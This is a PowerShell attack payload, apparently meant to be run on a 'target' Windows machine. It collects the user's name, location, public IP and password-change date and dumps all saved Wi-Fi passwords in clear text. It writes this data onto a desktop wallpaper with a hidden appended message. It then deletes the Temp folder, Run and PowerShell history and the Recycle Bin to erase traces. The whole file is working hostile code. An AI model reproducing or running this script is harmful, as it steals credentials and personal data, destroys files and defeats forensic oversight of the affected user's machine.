
 function Get-Name {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName

}

$fn = Get-Name

echo "Hey" $fn >> $Env:temp\foo.txt

echo "`nYour computer is not very secure" >> $Env:temp\foo.txt

#############################################################################################################################################


function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current location

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
		if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }
	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 

}

Get-GeoLocation
#if ($GL) { echo "`nYour Location: `n$GL" >> $Env:temp\foo.txt }


#############################################################################################################################################

<#

.NOTES  
	This will get the public IP from the target computer
#>


function Get-PubIP {

    try {

    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content

    }
 
 # If no Public IP is detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "No Public IP was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }

    return $computerPubIP
}

$PubIP = Get-PubIP
if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }


###########################################################################################################

<#

.NOTES 
	Password last Set
	This function will custom tailor a response based on how long it has been since they last changed their password
#>


 function Get-Days_Set {

    #-----VARIABLES-----#
    # $pls (password last set) = the date/time their password was last changed 
    # $days = the number of days since their password was last changed 

    try {
 
    $pls = net user $env:USERNAME | Select-String -Pattern "Password last" ; $pls = [string]$pls
    $plsPOS = $pls.IndexOf("e")
    $pls = $pls.Substring($plsPOS+2).Trim()
    $pls = $pls -replace ".{3}$"
    $time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
    $DateArray =$time.Split(".")
    $days = [int]$DateArray[0]
    return $pls
    
    }
 
 # If no password set date is detected function will return $null to cancel Sapi Speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "Day password set not found" 
    return $null
    -ErrorAction SilentlyContinue
    }
}

$pls = Get-Days_Set
if ($pls) { echo "`nPassword Last Set: $pls" >> $Env:temp\foo.txt }


###########################################################################################################

<#

.NOTES 
	All Wifi Networks and Passwords 
	This function will gather all current Networks and Passwords saved on the target computer
	They will be save in the temp directory to a file named with "$env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt"
#>


# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

# Get Wifi SSIDs and Passwords	
$WLANProfileNames =@()

#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

#Trim the output to receive only the name
Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()

#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){

    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }

    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}
    if (!$WLANProfileObjects) { Write-Host "variable is null" 
    }else { 

	# This is the name of the file the networks and passwords are saved to and later uploaded to the DropBox Cloud Storage

	echo "`nW-Lan profiles: ===============================" $WLANProfileObjects >> $Env:temp\foo.txt

$content = [IO.File]::ReadAllText("$Env:temp\foo.txt")
	}
#############################################################################################################################################

<#

.NOTES 
	This will get the dimension of the targets screen to make the wallpaper
#>

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class PInvoke {
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
}
"@
$hdc = [PInvoke]::GetDC([IntPtr]::Zero)
$w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
$h = [PInvoke]::GetDeviceCaps($hdc, 117) # height

#############################################################################################################################################

<#

.NOTES  
	This will get take the information gathered and format it into a .jpg
#>

Add-Type -AssemblyName System.Drawing

$filename = "$env:tmp\foo.jpg" 
$bmp = new-object System.Drawing.Bitmap $w,$h 
$font = new-object System.Drawing.Font Consolas,18 
$brushBg = [System.Drawing.Brushes]::White 
$brushFg = [System.Drawing.Brushes]::Black 
$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
$graphics.DrawString($content,$font,$brushFg,500,100) 
$graphics.Dispose() 
$bmp.Save($filename) 

# Invoke-Item $filename 

#############################################################################################################################################

<#

.NOTES 
	This will take your hidden message and use steganography to hide it in the image you use as the wallpaper 
	Then it will clean up the files you don't want to leave behind
#>

echo $hiddenMessage > $Env:temp\foo.txt
cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"

rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue


#############################################################################################################################################

<#

.NOTES 
	This will take the image you generated and set it as the targets wall paper
#>

Function Set-WallPaper {
 
<#
 
    .SYNOPSIS
    Applies a specified wallpaper to the current user's desktop
    
    .PARAMETER Image
    Provide the exact path to the image
 
    .PARAMETER Style
    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
  
    .EXAMPLE
    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
  
#>

 
param (
    [parameter(Mandatory=$True)]
    # Provide path to image
    [string]$Image,
    # Provide wallpaper style that you would like applied
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)
 
$WallpaperStyle = Switch ($Style) {
  
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
  
}
 
If($Style -eq "Tile") {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
 
}
Else {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
 
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

#----------------------------------------------------------------------------------------------------

function clean-exfil {


# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

#----------------------------------------------------------------------------------------------------

function Target-Comes {
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

Target-Comes

Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center

clean-exfil
 
